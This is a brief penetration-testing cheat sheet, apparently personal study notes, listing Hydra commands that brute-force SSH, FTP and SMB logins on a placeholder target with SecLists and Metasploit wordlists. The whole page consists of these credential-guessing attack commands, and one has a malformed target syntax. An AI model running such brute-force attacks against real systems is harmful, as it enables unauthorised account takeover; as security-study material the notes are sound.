# Hydra

### SSH brute-force

* <mark style="color:yellow;">hydra -l root -P /usr/share/SecLists/Passwords ssh:/targetip -t 2 -v</mark>
  * <mark style="color:yellow;">-t</mark>: Define number of threads to use
* <mark style="color:yellow;">hydra -L /usr/share/metasploit-framework/data/wordlists/common-users.txt -P /usr/share/metasploit-framework/data/wordlists/unix\_passwords.txt targetIP -t 4 ftp</mark>
* <mark style="color:yellow;">hydra -L /usr/share/metasploit-framework/data/wordlists/common\_users.txt -P /usr/share/metasploit-framework/data/wordlists/common\_passwords.txt targetIP -t 4 ssh</mark>
* <mark style="color:yellow;">hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix\_password.txt targetIP smb</mark>



